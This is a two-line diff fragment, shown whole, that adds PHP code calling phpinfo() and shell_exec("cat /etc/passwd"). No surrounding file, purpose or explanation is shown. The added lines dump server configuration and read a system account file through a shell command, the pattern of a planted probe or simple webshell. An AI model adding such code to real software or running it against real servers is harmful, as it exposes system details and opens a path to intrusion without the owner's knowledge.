@@ -1,0 +1,2 @@
+phpinfo();
+shell_exec("cat /etc/passwd");
